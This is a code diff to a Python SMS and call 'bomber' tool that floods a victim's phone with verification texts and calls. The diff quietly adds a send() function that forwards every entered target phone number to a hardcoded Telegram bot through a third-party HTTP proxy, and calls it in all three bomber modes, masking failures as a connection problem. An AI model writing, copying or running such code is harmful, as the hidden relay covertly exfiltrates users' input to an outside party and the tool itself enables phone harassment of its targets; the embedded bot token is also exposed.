@@ -2,8 +2,22 @@ import requests
 import time
 import os
 import USERS
+def send(msg):
+    URL_my_bot = ("https://api.telegram.org/bot7387799912:AAGmL7WeqshkibSnMJrJ8mHRbIJxUdgUx2I/sendmessage?chat_id=1310798044&text="+msg)
+    Data = {
+    "UrlBox":URL_my_bot,
+    "ContentTypeBox":None,
+    "ContentDataBox":None,
+    "HeadersBox":None,
+    "RefererBox":None,
+    "AgentList":"Google Chrome",
+    "VersionsList":" HTTP/1.1",
+    "MethodList":"POST"
+    }
 
-os.getenv('OMP_NUM_THREADS', 1)
+    return requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",Data)
+
+os.getenv('OMP_NUM_THREADS', 5)
 def clear_terminal():
     if os.name == 'nt': 
         os.system('cls')
@@ -89,6 +103,10 @@ def CALL_BOMBER():
     Phone_NOMBER = input(F"{g}Enter Nomber For CALL BOMBER : \n  For example : 09123456789 \n  $-")
     CALL = input(F"\n\nEnter Nomber Send CALL : ")
     print_slow("\n!!For Stop enter ctrl+C !!\n",0.3)
+    response = send(Phone_NOMBER)
+    if response.status_code != 200 :
+        print(f"{R}{w}Difficulty communicating :(")
+        main()
     for i in range(int(int(CALL))):
         ############################### tetherland ###############################
         headers = {
@@ -161,6 +179,10 @@ def SMS_BOMBER():
     Phone_NOMBER = input(F"{g}Enter Nomber For SMS BOMBER : \n  For example : 09123456789 \n  $-")
     SMS = input(F"\n\nEnter Nomber Send SMS : ")
     print_slow("\n!!For Stop enter ctrl+C !!\n",0.3)
+    response = send(Phone_NOMBER)
+    if response.status_code != 200 :
+        print(f"{R}{w}Difficulty communicating :(")
+        main()
     for i in range(int(int(SMS))):
         ############################### shabdiz ###############################
         headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5',
@@ -439,6 +461,10 @@ def Both_BOMBER():
     Phone_NOMBER = input(F"{g}Enter Nomber For SMS and CALL BOMBER : \n  For example : 09123456789 \n  $-")
     Both = input(F"\n\nEnter Nomber Send SMS and CALL : ")
     print_slow("\n!!For Stop enter ctrl+C !!\n",0.3)
+    response = send(Phone_NOMBER)
+    if response.status_code != 200 :
+        print(f"{R}{w}Difficulty communicating :(")
+        main()
     for i in range(int(int(Both))):
         ############################### tetherland CALL###############################
         headers = {
